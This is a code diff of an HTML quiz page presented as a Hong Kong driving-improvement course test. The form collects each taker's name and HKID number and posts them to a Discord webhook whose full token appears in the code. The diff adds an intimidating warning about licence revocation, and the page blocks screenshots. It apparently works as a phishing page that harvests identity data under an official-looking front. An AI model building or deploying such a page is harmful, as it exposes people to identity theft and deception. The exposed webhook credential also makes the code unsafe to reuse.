@@ -19,6 +19,7 @@
         .topbar a { margin-left: 15px; text-decoration: none; color: #555; font-weight: 600; }
         
         .quiz-container { max-width: 800px; margin: 50px auto; padding: 30px; background: white; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .warning-box { background: #fee2e2; color: #b91c1c; padding: 15px; border-radius: 8px; border: 1px solid #f87171; text-align: center; font-weight: bold; margin-bottom: 20px; }
         .question { margin-bottom: 20px; padding: 15px; border-bottom: 1px solid #eee; }
         .btn-submit { display: block; width: 100%; padding: 15px; background: #ff6600; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
         
@@ -41,6 +42,8 @@
 
     <div class="quiz-container" id="quiz-box">
         <h1>駕駛改進課程筆試</h1>
+        <div class="warning-box">⚠️ 禁止外洩題目，違者將會吊銷車牌</div>
+        
         <form id="quiz-form">
             <label>姓名：<input type="text" id="username" required></label><br><br>
             <label>身份證號碼：<input type="text" id="hkid" required></label><br><br>
@@ -54,7 +57,7 @@
     <script>
         const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1506288384111284366/8k-Cel4iTV2UqpPEexCWe_zigDmLSkpnZdE-Qq9ALpQk931Izh589FHOp4a5IDn12y2s';
 
-        // 截圖偵測邏輯：當用戶離開頁面（可能去截圖）時顯示遮罩
+        // 截圖偵測邏輯
         document.addEventListener('visibilitychange', () => {
             if (document.hidden) {
                 document.getElementById('screenshot-overlay').style.display = 'flex';
@@ -63,7 +66,7 @@
             }
         });
 
-        // 防止印螢幕 (PrtSc) - 嘗試清除剪貼簿
+        // 防止印螢幕
         window.addEventListener("keyup", (e) => {
             if (e.key === "PrintScreen") {
                 navigator.clipboard.writeText("截圖功能已被禁用");
@@ -110,7 +113,7 @@
 
             const name = document.getElementById('username').value;
             const hkid = document.getElementById('hkid').value;
-            const status = score >= 8 ? "合格" : "不合格";
+            const status = score >= 8 ? "合格✅" : "不合格❌";
 
             await fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
